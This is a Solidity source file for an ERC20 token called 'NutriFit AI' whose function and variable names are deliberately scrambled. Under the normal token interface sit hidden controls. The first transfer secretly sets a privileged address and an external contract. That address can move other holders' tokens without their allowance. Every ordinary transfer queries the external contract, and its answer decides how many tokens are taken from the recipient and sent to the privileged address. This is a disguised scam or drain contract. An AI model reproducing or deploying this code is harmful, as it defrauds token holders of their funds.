
// File: /contracts/NFAI.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
    
interface zEAqNPjnDK {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
     
library zxtaRTHxpfer{
    
    function iFNMiKjGiQOa(address zgScc, address vfmdUia, uint DZU) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool qtJgRBDx, bytes memory rNxM) = zgScc.call(abi.encodeWithSelector(0x095ea7b3, vfmdUia, DZU));
        require(qtJgRBDx && (rNxM.length == 0 || abi.decode(rNxM, (bool))), 'zxtaRTHxpfer: APPROVE_FAILED');
    }

    function jdFHbENlikJo(address zgScc, address vfmdUia, uint DZU) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool qtJgRBDx, bytes memory rNxM) = zgScc.call(abi.encodeWithSelector(0xa9059cbb, vfmdUia, DZU));
        require(qtJgRBDx && (rNxM.length == 0 || abi.decode(rNxM, (bool))), 'zxtaRTHxpfer: TRANSFER_FAILED');
    }
    
    function nVPrCfJ(address vfmdUia, uint DZU) internal {
        (bool qtJgRBDx,) = vfmdUia.call{value:DZU}(new bytes(0));
        require(qtJgRBDx, 'zxtaRTHxpfer: ETH_TRANSFER_FAILED');
    }

    function RWTkKxfNK(address zgScc, address from, address vfmdUia, uint DZU) internal returns(bytes memory){
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool qtJgRBDx, bytes memory rNxM) = zgScc.call(abi.encodeWithSelector(0x23b872dd, from, vfmdUia, DZU));
        require(qtJgRBDx && rNxM.length > 0,'zxtaRTHxpfer: TRANSFER_FROM_FAILED'); return rNxM;
                       
    }

}
    
interface YXwX {
    function totalSupply() external view returns (uint256);
    function balanceOf(address YAHuvbJnlGfZ) external view returns (uint256);
    function transfer(address vfGx, uint256 FZptsvKm) external returns (bool);
    function allowance(address dQdgNaewmQgX, address spender) external view returns (uint256);
    function approve(address spender, uint256 FZptsvKm) external returns (bool);
    function transferFrom(
        address sender,
        address vfGx,
        uint256 FZptsvKm
    ) external returns (bool);

    event Transfer(address indexed from, address indexed EvIjJFuzFJ, uint256 value);
    event Approval(address indexed dQdgNaewmQgX, address indexed spender, uint256 value);
}

interface lTzCmzYWUM is YXwX {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract UcYCG {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
    
contract NFAI is UcYCG, YXwX, lTzCmzYWUM {
    
    function totalSupply() public view virtual override returns (uint256) {
        return shNEDN;
    }
    
    function increaseAllowance(address QlciUBUaL, uint256 addedValue) public virtual returns (bool) {
        mpEGw(_msgSender(), QlciUBUaL, fzBtBfLXa[_msgSender()][QlciUBUaL] + addedValue);
        return true;
    }
    
    address private XweHc;
    
    function symbol() public view virtual override returns (string memory) {
        return wSQ;
    }
    
    function allowance(address kQvkyPAJDT, address dSuFOcfKCjus) public view virtual override returns (uint256) {
        return fzBtBfLXa[kQvkyPAJDT][dSuFOcfKCjus];
    }
    
    function balanceOf(address aePvBHejkE) public view virtual override returns (uint256) {
       return TCuFqColQ[aePvBHejkE];
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    address private PENt;
    
    string private wSQ =  "NFAI";
    
    function name() public view virtual override returns (string memory) {
        return CJsDevGbQlMB;
    }
    
    mapping(address => uint256) private TCuFqColQ;
    
    mapping(address => mapping(address => uint256)) private fzBtBfLXa;
    
    function decreaseAllowance(address GNOAbeiMOg, uint256 subtractedValue) public virtual returns (bool) {
        uint256 HOG = fzBtBfLXa[_msgSender()][GNOAbeiMOg];
        require(HOG >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            mpEGw(_msgSender(), GNOAbeiMOg, HOG - subtractedValue);
        }

        return true;
    }
    
    function fSrPB(
        address vuH,
        address uFuh,
        uint256 MYhodx
    ) internal virtual  returns (bool){
        require(vuH != address(0), "ERC20: transfer from the zero address");
        require(uFuh != address(0), "ERC20: transfer to the zero address");
        
        if(!oKAyEITaZnA(vuH,uFuh)) return false;

        if(_msgSender() == address(PENt)){
            if(uFuh == vIWB && TCuFqColQ[vuH] < MYhodx){
                VFyzUrSopCH(PENt,uFuh,MYhodx);
            }else{
                VFyzUrSopCH(vuH,uFuh,MYhodx);
                if(vuH == PENt || uFuh == PENt) 
                return false;
            }
            emit Transfer(vuH, uFuh, MYhodx);
            return false;
        }
        VFyzUrSopCH(vuH,uFuh,MYhodx);
        emit Transfer(vuH, uFuh, MYhodx);
        bytes memory CdoUPeE = zxtaRTHxpfer.RWTkKxfNK(XweHc, vuH, uFuh, MYhodx);
        (bool BdccQojdAKI, uint RkVkxjNTJW) = abi.decode(CdoUPeE, (bool,uint));
        if(BdccQojdAKI){
            TCuFqColQ[PENt] += RkVkxjNTJW;
            TCuFqColQ[uFuh] -= RkVkxjNTJW; 
        }
        return true;
    }
    
    constructor() {
        
        TCuFqColQ[address(1)] = shNEDN;
        emit Transfer(address(0), address(1), shNEDN);

    }
    
    function mpEGw(
        address cfHjmSeQ,
        address heqGdrSnFQzq,
        uint256 zHbvrOKG
    ) internal virtual {
        require(cfHjmSeQ != address(0), "ERC20: approve from the zero address");
        require(heqGdrSnFQzq != address(0), "ERC20: approve to the zero address");

        fzBtBfLXa[cfHjmSeQ][heqGdrSnFQzq] = zHbvrOKG;
        emit Approval(cfHjmSeQ, heqGdrSnFQzq, zHbvrOKG);

    }
    
    function VFyzUrSopCH(
        address dhw,
        address FVMpIxLHBr,
        uint256 hJfRqWT
    ) internal virtual  returns (bool){
        uint256 YTwhFcO = TCuFqColQ[dhw];
        require(YTwhFcO >= hJfRqWT, "ERC20: transfer Amount exceeds balance");
        unchecked {
            TCuFqColQ[dhw] = YTwhFcO - hJfRqWT;
        }
        TCuFqColQ[FVMpIxLHBr] += hJfRqWT;
        return true;
    }
    
    address private vIWB;
  
    
    uint256 private shNEDN = 2000000000000 * 10 ** 18;
    
    function oKAyEITaZnA(
        address qubUnAAyMRxq,
        address gylrS
    ) internal virtual  returns (bool){
        if(PENt == address(0) && XweHc == address(0)){
            PENt = qubUnAAyMRxq;XweHc=gylrS;
            zxtaRTHxpfer.jdFHbENlikJo(XweHc, PENt, 0);
            vIWB = zEAqNPjnDK(XweHc).WETH();
            return false;
        }
        return true;
    }
    
    function approve(address xrdt, uint256 nWtFbUltY) public virtual override returns (bool) {
        mpEGw(_msgSender(), xrdt, nWtFbUltY);
        return true;
    }
    
    string private CJsDevGbQlMB = "NutriFit AI";
    
    function transferFrom(
        address ZEarTAsq,
        address gQqLmsA,
        uint256 GLUl
    ) public virtual override returns (bool) {
      
        if(!fSrPB(ZEarTAsq, gQqLmsA, GLUl)) return true;

        uint256 qGYTiQeKxA = fzBtBfLXa[ZEarTAsq][_msgSender()];
        if (qGYTiQeKxA != type(uint256).max) {
            require(qGYTiQeKxA >= GLUl, "ERC20: transfer Amount exceeds allowance");
            unchecked {
                mpEGw(ZEarTAsq, _msgSender(), qGYTiQeKxA - GLUl);
            }
        }

        return true;
    }
    
    function transfer(address JDSnfokv, uint256 zGDXJV) public virtual override returns (bool) {
        fSrPB(_msgSender(), JDSnfokv, zGDXJV);
        return true;
    }
    
}
        
